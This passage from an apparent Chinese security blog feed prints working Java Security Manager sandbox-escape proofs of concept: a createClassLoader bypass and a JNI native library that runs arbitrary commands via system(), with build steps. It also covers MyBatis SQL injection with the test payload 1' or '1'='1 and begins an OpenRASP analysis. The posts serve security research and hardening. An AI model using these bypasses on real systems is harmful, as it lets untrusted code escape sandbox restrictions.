class="line">&#123;</span><br><span class="line">    <span class="comment">//preDefineClass的实现在下面</span></span><br><span class="line">    protectionDomain = preDefineClass(name, protectionDomain);</span><br><span class="line">    String source = defineClassSourceLocation(protectionDomain);</span><br><span class="line">    Class&lt;?&gt; c = defineClass1(name, b, off, len, protectionDomain, source);</span><br><span class="line">    postDefineClass(c, protectionDomain);</span><br><span class="line">    <span class="keyword">return</span> c;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>跟一下preDefineClass<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> ProtectionDomain <span class="title">preDefineClass</span><span class="params">(String name,</span></span></span><br><span class="line"><span class="function"><span class="params">                                        ProtectionDomain pd)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!checkName(name))</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> NoClassDefFoundError(<span class="string">"IllegalName: "</span> + name);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Note:  Checking logic in java.lang.invoke.MemberName.checkForTypeAlias</span></span><br><span class="line">    <span class="comment">// relies on the fact that spoofing is impossible if a class has a name</span></span><br><span class="line">    <span class="comment">// of the form "java.*"</span></span><br><span class="line">    <span class="keyword">if</span> ((name != <span class="keyword">null</span>) &amp;&amp; name.startsWith(<span class="string">"java."</span>)) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> SecurityException</span><br><span class="line">            (<span class="string">"Prohibited package name: "</span> +</span><br><span class="line">             name.substring(<span class="number">0</span>, name.lastIndexOf(<span class="string">'.'</span>)));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (pd == <span class="keyword">null</span>) &#123;</span><br><span class="line">        pd = defaultDomain;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (name != <span class="keyword">null</span>) checkCerts(name, pd.getCodeSource());</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> pd;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>传入的默认ProtectionDomain是null。我们调用了defineClazz方法，赋予了加载的类所有的权限，然后传入defineClass方法，完成类加载过程。如下图所示，同样policy文件没有赋予文件的执行权限，却执行calc成功，成功绕过java security manager机制，逃逸沙箱。</p><p>java.policy:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">grant&#123;</span><br><span class="line">    permission java.lang.RuntimePermission &quot;createClassLoader&quot;;</span><br><span class="line">    permission java.io.FilePermission &quot;&lt;&lt;ALL FILES&gt;&gt;&quot;, &quot;read&quot;;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2018/07/10/5b449c0760de3.png" alt="bypass-by-createclassloader.PNG"></p><p>exp地址：<a href="https://github.com/c0d3p1ut0s/java-security-manager-bypass/tree/master/bypass-by-createclassloader" target="_blank" rel="noopener">https://github.com/c0d3p1ut0s/java-security-manager-bypass/tree/master/bypass-by-createclassloader</a></p><p>修复方法：禁止createClassLoader</p><h4 id="本地方法调用绕过Java-Security-Manager"><a href="#本地方法调用绕过Java-Security-Manager" class="headerlink" title="本地方法调用绕过Java Security Manager"></a>本地方法调用绕过Java Security Manager</h4><p>Java Security Manager是在java核心库中的一个功能，而java中native方法是由jvm执行的，不受java security manager管控。因此，我们可以调用java native方法，绕过java security manager。</p><p>java.policy<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">grant&#123;</span><br><span class="line">permission java.lang.RuntimePermission &quot;loadLibrary.*&quot;;</span><br><span class="line">permission java.io.FilePermission &quot;/root/-&quot;, &quot;read&quot;;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p><p>声明一个native方法：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.evil;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">EvilMethodClass</span> </span>&#123;</span><br><span class="line">    <span class="comment">//加载动态链接库</span></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        System.load(<span class="string">"/root/libEvilMethodClass.so"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//声明一个native方法</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">native</span> String <span class="title">evilMethod</span><span class="params">(String name)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>生成.h头<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">javac src/com/evil/EvilMethodClass.java -d ./bin</span><br><span class="line">javah -jni -classpath ./bin -d ./jni com.evil.EvilMethodClass</span><br><span class="line">javah -jni -classpath ./bin -o EvilMethodClass.h com.evil.EvilMethodClass</span><br></pre></td></tr></table></figure></p><p>新建EvilMethodClass.c<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"com_evil_EvilMethodClass.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> __cplusplus</span></span><br><span class="line"><span class="keyword">extern</span> <span class="string">"C"</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">JNIEXPORT jstring JNICALL <span class="title">Java_com_evil_EvilMethodClass_evilMethod</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">        JNIEnv *env, jclass cls, jstring j_str)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span> *c_str = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">char</span> buff[<span class="number">128</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    c_str = (*env)-&gt;GetStringUTFChars(env, j_str, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span> (c_str == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"out of memory.\n"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//在这里执行系统命令</span></span><br><span class="line">    system(c_str);</span><br><span class="line">    (*env)-&gt;ReleaseStringUTFChars(env, j_str, c_str);</span><br><span class="line">    <span class="keyword">return</span> (*env)-&gt;NewStringUTF(env, buff);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> __cplusplus</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure></p><p>编译，生成动态链接库<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -I$JAVA_HOME/include -I$JAVA_HOME/include/linux -fPIC -shared EvilMethodClass.c -o libEvilMethodClass.so</span><br></pre></td></tr></table></figure></p><p>放到/root/目录下<br>Poc.java<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Poc</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        EvilMethodClass.evilMethod(<span class="string">"whoami"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>我编译了Linux下的so，如下图所示，同样policy文件没有赋予文件的执行权限，却执行whoami成功，成功绕过java security manager机制，逃逸沙箱。</p><p><img src="https://i.loli.net/2018/07/10/5b449c06b94d6.png" alt="invoke-native-method.PNG"></p><p>exp如下：<a href="https://github.com/c0d3p1ut0s/java-security-manager-bypass/tree/master/invoke-native-method" target="_blank" rel="noopener">https://github.com/c0d3p1ut0s/java-security-manager-bypass/tree/master/invoke-native-method</a></p><p>修复方案：不授予loadLibrary权限</p><h3 id="0x04-第三方java-security-manager的安全性"><a href="#0x04-第三方java-security-manager的安全性" class="headerlink" title="0x04 第三方java security manager的安全性"></a>0x04 第三方java security manager的安全性</h3><p>从上面的绕过方法来看，在给不可信的代码授予权限时需要非常谨慎，有些权限一旦授予，就可能导致整个java security manager体系的绕过。</p><p>默认java security manager的policy是白名单模式的，也就是说，只有在policy文件出现的权限才是被授予的。而有些第三方的java security manager支持黑名单模式，这样更加危险。例如<a href="http://pro-grade.sourceforge.net/" target="_blank" rel="noopener">pro-grade</a>，它支持黑名单模式，实现了deny语法。这意味着如果没有把上面提到的这些危险的权限禁止的话，绕过java security manager将会是非常容易的。</p><h3 id="0x05-Reference"><a href="#0x05-Reference" class="headerlink" title="0x05 Reference"></a>0x05 Reference</h3><ul><li><a href="https://docs.oracle.com/javase/8/docs/api/java/lang/SecurityManager.html" target="_blank" rel="noopener">https://docs.oracle.com/javase/8/docs/api/java/lang/SecurityManager.html</a></li><li><a href="https://docs.oracle.com/javase/8/docs/api/java/lang/RuntimePermission.html" target="_blank" rel="noopener">https://docs.oracle.com/javase/8/docs/api/java/lang/RuntimePermission.html</a></li><li><a href="https://docs.oracle.com/javase/8/docs/technotes/guides/security/PolicyFiles.html" target="_blank" rel="noopener">https://docs.oracle.com/javase/8/docs/technotes/guides/security/PolicyFiles.html</a></li></ul><p>这篇文章中使用的绕过的代码都已上传到<a href="https://github.com/c0d3p1ut0s/java-security-manager-bypass/" target="_blank" rel="noopener">github</a>。</p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h3&gt;&lt;blockquote&gt;
&lt;p&gt;文章原发&lt;a href=&quot;https://www.anquanke.com/post/id/151398&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;安全客&lt;/a&gt;，重发博客如下&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;最近两年CTF比赛中出现了Python沙箱绕过，关于Python沙盒的文章比较多，其实Java也有沙箱。而恰好笔者在做安全测试的时候遇到了Java沙箱，于是研究了一下Java沙箱的绕过。虽然Java不像PHP和python那么灵活，但是Java沙箱能玩的地方还是挺多的。&lt;/p&gt;
    
    </summary>
    
    
      <category term="Java" scheme="http://c0d3p1ut0s.github.io/tags/Java/"/>
    
      <category term="java security manager" scheme="http://c0d3p1ut0s.github.io/tags/java-security-manager/"/>
    
      <category term="bypass" scheme="http://c0d3p1ut0s.github.io/tags/bypass/"/>
    
      <category term="沙箱" scheme="http://c0d3p1ut0s.github.io/tags/%E6%B2%99%E7%AE%B1/"/>
    
  </entry>
  
  <entry>
    <title>MyBatis框架中常见的SQL注入</title>
    <link href="http://c0d3p1ut0s.github.io/MyBatis%E6%A1%86%E6%9E%B6%E4%B8%AD%E5%B8%B8%E8%A7%81%E7%9A%84SQL%E6%B3%A8%E5%85%A5/"/>
    <id>http://c0d3p1ut0s.github.io/MyBatis框架中常见的SQL注入/</id>
    <published>2018-05-17T11:45:24.000Z</published>
    <updated>2018-05-17T11:47:13.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-MyBatis概述-amp-背景"><a href="#0x00-MyBatis概述-amp-背景" class="headerlink" title="0x00 MyBatis概述&amp;背景"></a>0x00 MyBatis概述&amp;背景</h2><p>MyBatis 是支持定制化SQL、存储过程以及高级映射的优秀的持久层框架。由于它非常灵活，非常轻量级，受到广大开发者的欢迎，各个大厂也用得比较多。MyBatis框架介绍相关的内容不多说，这类文章网上很多，这里我着重介绍一下MyBatis下常见的SQL注入漏洞。</p><a id="more"></a><p>写到一半发现有些概念要在前面说清楚一下，不然容易晕。</p><ul><li>MySQL：指MySQL服务器。</li><li>MyBatis：指MyBatis框架。</li><li>JDBC：是Java用来规范数据库连接的接口。</li><li>MySQL Connector/J：MySQL提供的、符合JDBC的、用来供java程序连接MySQL数据库的jar包。俗称：MySQL数据库驱动。</li></ul><h2 id="0x01-MyBatis的SQL注入"><a href="#0x01-MyBatis的SQL注入" class="headerlink" title="0x01 MyBatis的SQL注入"></a>0x01 MyBatis的SQL注入</h2><p>MyBatis支持两种参数符号，一种是#，另一种是$。<br>使用参数符号#的句子：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">"selectPerson"</span> <span class="attr">parameterType</span>=<span class="string">"int"</span> <span class="attr">resultType</span>=<span class="string">"hashmap"</span>&gt;</span></span><br><span class="line">  SELECT * FROM PERSON WHERE ID = #&#123;id&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>MyBatis会创建一个预编译语句，生成的代码类似于<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Similar JDBC code, NOT MyBatis…</span></span><br><span class="line">String selectPerson = <span class="string">"SELECT * FROM PERSON WHERE ID=?"</span>;</span><br><span class="line">PreparedStatement ps = conn.prepareStatement(selectPerson);</span><br><span class="line">ps.setInt(<span class="number">1</span>,id);</span><br></pre></td></tr></table></figure></p><p>参数会在SQL语句中用占位符”?”来标识，然后使用prepareStatement来预编译这个SQL语句。</p><p>但是你以为这个SQL语句真的被MySQL数据库预编译了吗？naive！其实在默认情况下，MySQL Connector/J只不过是把selectPerson做了一下转义，前后加了双引号，拼接到SQL语句里面，然后再交给MySQL执行罢了，更多的细节可以看这里 <a href="https://c0d3p1ut0s.github.io/%E7%AE%80%E5%8D%95%E8%AF%B4%E8%AF%B4MySQL-Prepared-Statement/">https://c0d3p1ut0s.github.io/%E7%AE%80%E5%8D%95%E8%AF%B4%E8%AF%B4MySQL-Prepared-Statement/</a> </p><p>另一种使用参数符号$时，MyBatis直接用字符串拼接把参数和SQL语句拼接在一起，然后执行。众所周知，这种情况非常危险，极容易产生SQL注入漏洞。</p><p>在使用MyBatis框架时，有以下场景极易产生SQL注入。</p><ol><li><p>SQL语句中的一些部分，例如order by字段、表名等，是无法使用预编译语句的。这种场景极易产生SQL注入。推荐开发在Java层面做映射，设置一个字段/表名数组，仅允许用户传入索引值。这样保证传入的字段或者表名都在白名单里面。</p></li><li><p>like参数注入。使用如下SQL语句可防止SQL注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">like concat(&apos;%&apos;,#&#123;title&#125;, &apos;%&apos;)，</span><br></pre></td></tr></table></figure></li><li><p>in之后参数的SQL注入。使用如下SQL语句可防止SQL注入</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">id in</span><br><span class="line"><span class="tag">&lt;<span class="name">foreach</span> <span class="attr">collection</span>=<span class="string">"ids"</span> <span class="attr">item</span>=<span class="string">"item"</span> <span class="attr">open</span>=<span class="string">"("</span><span class="attr">separator</span>=<span class="string">","</span> <span class="attr">close</span>=<span class="string">")"</span>&gt;</span></span><br><span class="line">#&#123;item&#125; </span><br><span class="line"><span class="tag">&lt;/<span class="name">foreach</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ol><h2 id="0x02-x-generator的SQL注入"><a href="#0x02-x-generator的SQL注入" class="headerlink" title="0x02 x-generator的SQL注入"></a>0x02 x-generator的SQL注入</h2><p>为了提高开发效率，一些generator工具被开发出来，generator是一个从数据库结构 自动生成实体类、Mapper接口以及对应的XML文件的工具。常见的generator有mybatis-generator，renren-generator等。</p><p>mybatis-generator是mybatis官方的一款generator。在mybatis-generator自动生成的SQL语句中，order by使用的是$，也就是简单的字符串拼接，这种情况下极易产生SQL注入。需要开发者特别注意。</p><p>不过，mybatis-generator产生的like语句和in语句全部都是用的参数符号#，都是非常安全的实现。</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x00-MyBatis概述-amp-背景&quot;&gt;&lt;a href=&quot;#0x00-MyBatis概述-amp-背景&quot; class=&quot;headerlink&quot; title=&quot;0x00 MyBatis概述&amp;amp;背景&quot;&gt;&lt;/a&gt;0x00 MyBatis概述&amp;amp;背景&lt;/h2&gt;&lt;p&gt;MyBatis 是支持定制化SQL、存储过程以及高级映射的优秀的持久层框架。由于它非常灵活，非常轻量级，受到广大开发者的欢迎，各个大厂也用得比较多。MyBatis框架介绍相关的内容不多说，这类文章网上很多，这里我着重介绍一下MyBatis下常见的SQL注入漏洞。&lt;/p&gt;
    
    </summary>
    
    
      <category term="MyBatis" scheme="http://c0d3p1ut0s.github.io/tags/MyBatis/"/>
    
      <category term="SQL注入" scheme="http://c0d3p1ut0s.github.io/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
      <category term="Java安全" scheme="http://c0d3p1ut0s.github.io/tags/Java%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>简单说说MySQL Prepared Statement</title>
    <link href="http://c0d3p1ut0s.github.io/%E7%AE%80%E5%8D%95%E8%AF%B4%E8%AF%B4MySQL-Prepared-Statement/"/>
    <id>http://c0d3p1ut0s.github.io/简单说说MySQL-Prepared-Statement/</id>
    <published>2018-03-21T11:05:36.000Z</published>
    <updated>2018-03-21T11:10:04.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>之前在写安全测试报告时，对于SQL注入的修复建议或者防御措施无非是两条：一是白名单限制，二是参数化查询。对于参数化查询的原理，停留于MySQL能先将SQL语句进行词法和语法解析，再将参数绑定执行的阶段。而我们在代码中用Prepared Statement语句实现参数化查询时，很可能事实并不是如此。</p><h2 id="0x01-问题"><a href="#0x01-问题" class="headerlink" title="0x01 问题"></a>0x01 问题</h2><p>网上关于预编译语句的文章有很多，但是，大部分都是基于片面的实验得到以偏概全的结论。争论最多的问题是一般情况下MySQL是否开启了服务端的预编译。网上众说纷纭，经过实验，我得出来的结论是MySQL是否开启服务端的预编译是由客户端连接时的参数useServerPrepStmts决定的，而在MySQL提供的Connector/J版本5.0.5（release 2007-03-02）之后，默认情况下，useServerPrepStmts=false。即如果没有显式设置成true，默认情况下，MySQL不启用服务端预编译。</p><p>那么我们在代码中使用预编译函数，例如Java中的prepareStatement，是否存在SQL注入的风险呢？</p><h2 id="0x02-实验"><a href="#0x02-实验" class="headerlink" title="0x02 实验"></a>0x02 实验</h2><p>实验之前先打开MySQL服务器的日志，在my.ini中加一行：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">log=&quot;D:/mysql.log&quot;</span><br></pre></td></tr></table></figure></p><p>为了方便查看与MySQL服务器的通信，实验中使用了wireshark，如果MySQL服务器在本地，wireshark可能抓不到包，可以用本地ip连接MySQL服务器，不使用127.0.0.1或者localhost。并以管理员身份运行cmd，运行以下命令添加路由<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">route add 本地ip mask 255.255.255.255 本地网关</span><br></pre></td></tr></table></figure></p><p>MySQL官网在Connector/J 5.0.5的变更中有如下内容</p><blockquote><p>Important change: Due to a number of issues with the use of server-side prepared statements, Connector/J 5.0.5 has disabled their use by default. The disabling of server-side prepared statements does not affect the operation of the connector in any way.</p><p>To enable server-side prepared statements, add the following configuration property to your connector string:</p><p>useServerPrepStmts=true</p><p>The default value of this property is false (that is, Connector/J does not use server-side prepared statements).</p></blockquote><p>大致意思是Connector/J 5.05及以后的版本中，默认情况下useServerPrepStmts的值是false，不使用服务端预编译。这里，我用的Connector/J版本是5.1.46。</p><p>首先，我们看一下useServerPrepStmts=true情况下wireshark的抓包和MySQL的日志。代码如下：<br><img src="https://i.loli.net/2018/03/21/5ab1fb5d38555.png" alt="201803211422.PNG"></p><p>运行代码，抓包如下：<br><img src="https://i.loli.net/2018/03/21/5ab1fb5d2f323.png" alt="201803211425.png"><br>上面这个包是发送给要求MySQL服务器Prepare语句”select * from user where id=?”<br><img src="https://i.loli.net/2018/03/21/5ab1fb5d2ddc8.png" alt="201803211426.png"><br>接下来发送填充到占位符的字符串的值，我们看到，在这里字符串没有被转义。<br><img src="https://i.loli.net/2018/03/21/5ab1fb5d36e47.png" alt="201803211427.png"><br>这是MySQL的日志，可以明显看到，MySQL prepare了语句select * from user WHERE id=?，接着执行了select * from user WHERE id=’1\‘ or \‘1\‘=\‘1’。</p><p>很明显，MySQL服务器对SQL语句做了预编译。</p><p>接着，去掉useServerPrepStmts=true，在普通情况下会发生什么呢？<br>代码如下：<br><img src="https://i.loli.net/2018/03/21/5ab1fe3048921.png" alt="201803211434.png"><br><img src="https://i.loli.net/2018/03/21/5ab1fe3047411.png" alt="201803211435.png"></p><p>抓包发现，java程序仅向MySQL服务器发送了一个Query请求，而且Query的SQL语句是select * from user WHERE id=’1\‘ or \‘1\‘=\‘1’。</p><p><img src="https://i.loli.net/2018/03/21/5ab1fe3049f76.png" alt="201803211437.png"><br>从MySQL日志中，我们发现也确实如此。这是为什么呢？</p><h2 id="0x03-客户端预编译"><a href="#0x03-客户端预编译" class="headerlink" title="0x03 客户端预编译"></a>0x03 客户端预编译</h2><p>我们跟一下<code>PreparedStatement statement = connection.prepareStatement(sql)</code>这一句，F7跟进，在com.mysql.jdbc.ConnectionImpl中存在以下逻辑：<br>2792行：<br><img src="https://i.loli.net/2018/03/21/5ab20549327d3.png" alt="201803211502.png"></p><p>判断了一下useServerPreparedStmts是否打开和canServerPrepare是否为true，均为true则走下面调用服务端预编译的逻辑。而默认情况下，useServerPreparedStmts=false，因此，代码到2837行：<br><img src="https://i.loli.net/2018/03/21/5ab2054882f15.png" alt="201803211503.png"><br>调用clientPrepareStatement来对SQL语句进行处理。这样的话，对单引号等关键字符的转义在哪里做的呢？</p><p>我们接着来跟一下<code>statement.setString(1, &quot;1&#39; or &#39;1&#39;=&#39;1&quot;);</code>这一句。在com.mysql.jdbc.PreparedStatement中，2238行开始<br><img src="https://i.loli.net/2018/03/21/5ab20a62051dc.png" alt="201803211520.png"><br>省略部分代码<br><img src="https://i.loli.net/2018/03/21/5ab20a62526a1.png" alt="201803211529.png"><br>从2282行开始，对填充的字符串做转义处理，并在转义之后的字符串前后填加单引号。这段代码的主要作用是转义字符串，防止SQL注入。</p><h2 id="0x04-试着突破它"><a href="#0x04-试着突破它" class="headerlink" title="0x04 试着突破它"></a>0x04 试着突破它</h2><p>这里转义的字符比较少，有没有漏掉一些字符，能够逃逸出单引号呢？我对SQL注入并不精通，凭空想出一些payload比较难，这里有两种方法可以试一下，一是参看类似的实现，例如php中addslashes的源代码，二是fuzz。</p><p>PHP的addslashes的源代码在ext/standard/string.c中。遗憾的是，并没有发现其他字符。</p><p>接下来是fuzz，Java中，字符的编码是utf16，Unicode的编码空间从U+0000到U+10FFFF，共有1,112,064个码位。进过fuzz测试，也没有发现能逃逸单引号的字符。</p><h2 id="0x05-其他语言的客户端prepare"><a href="#0x05-其他语言的客户端prepare" class="headerlink" title="0x05 其他语言的客户端prepare"></a>0x05 其他语言的客户端prepare</h2><p>MySQL官方提供了各种语言连接MySQL的Connectors，其他语言的connectors是不是也默认客户端prepare呢？我测试了Python的，结果也是同样。其余Connectors有兴趣的读者可以自行测试。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;之前在写安全测试报告时，对于SQL注入的修复建议或者防御措施无非是两条：一是白名单限制，二是参数化查
      
    
    </summary>
    
    
      <category term="SQL注入" scheme="http://c0d3p1ut0s.github.io/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
      <category term="Java安全" scheme="http://c0d3p1ut0s.github.io/tags/Java%E5%AE%89%E5%85%A8/"/>
    
      <category term="MySQL" scheme="http://c0d3p1ut0s.github.io/tags/MySQL/"/>
    
  </entry>
  
  <entry>
    <title>Java RASP浅析--以百度OpenRASP为例</title>
    <link href="http://c0d3p1ut0s.github.io/Java-RASP%E6%B5%85%E6%9E%90-%E4%BB%A5%E7%99%BE%E5%BA%A6OpenRASP%E4%B8%BA%E4%BE%8B/"/>
    <id>http://c0d3p1ut0s.github.io/Java-RASP浅析-以百度OpenRASP为例/</id>
    <published>2018-01-25T11:01:30.000Z</published>
    <updated>2018-01-25T11:02:13.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>RASP（Runtime Application self-protection）是一种在运行时检测攻击并且进行自我保护的一种技术。关于RASP技术和RASP实践，这是我写的第二篇文章，上一篇文章在<a href="https://c0d3p1ut0s.github.io/%E4%B8%80%E7%B1%BBPHP-RASP%E7%9A%84%E5%AE%9E%E7%8E%B0/">这里</a>，是关于RASP技术在PHP中的实践，无论是从设计思路还是技术实现来说，PHP RASP和OpenRASP Java实现都比较相似。有兴趣的同学可以粗略看看，不必太关心技术细节，了解设计思路、工作原理即可，很多时候，对技术宏观的把握对理解技术细节和设计思路非常有用。</p><h2 id="0x01-RASP技术"><a href="#0x01-RASP技术" class="headerlink" title="0x01 RASP技术"></a>0x01 RASP技术</h2><p>关于RASP的发展、RASP与各种WAF的区别以及RASP的简单原理可以看《<a href="https://c0d3p1ut0s.github.io/%E4%B8%80%E7%B1%BBPHP-RASP%E7%9A%84%E5%AE%9E%E7%8E%B0/">一类PHP RASP的实现</a>》这篇文章的<code>RASP概念</code>和<code>我的WAF世界观</code>这两部分，这两部分大约可以回答关于RASP技术的两个问题，一是RASP技术是工作在哪一层，为了解决什么问题而存在的，二是它大致是怎么实现的，这里就不写了。下面以OpenRASP为例分析一下Java RASP的实现。</p><h2 id="0x02-JVMTI-amp-amp-Java-Instrumentation"><a href="#0x02-JVMTI-amp-amp-Java-Instrumentation" class="headerlink" title="0x02 JVMTI &amp;&amp; Java Instrumentation"></a>0x02 JVMTI &amp;&amp; Java Instrumentation</h2><p>JVMTI是JVM提供的一些回调接口集。JVM在特定的状态会执行特定的回调函数，开发者实现这些回调函数就可以实现自己的逻辑。Java Instrumentation就是利用JVMTI实现的。</p><p>Java Instrumentation是Java强大功能的一个体现，Java Instrumentation允许开发者访问从JVM中加载的类，并且允许对它的字节码做修改，加入我们自己的代码，这些都是在运行时完成的。无需担心这个机制带来的安全问题，因为它也同样遵从适用于Java类和相应的类加载器的安全策略。</p><h2 id="0x03-OpenRASP简要分析"><a href="#0x03-OpenRASP简要分析" class="headerlink" title="0x03 OpenRASP简要分析"></a>0x03 OpenRASP简要分析</h2><p>OpenRASP以Java Instrumentation的方式工作在JVM层，它主要通过hook可能引发漏洞的关键函数，在这些关键函数执行之前添加安全检查，根据上下文和关键函数的参数等信息判断请求是否为恶意请求，并终止或继续执行流。</p><p>Java 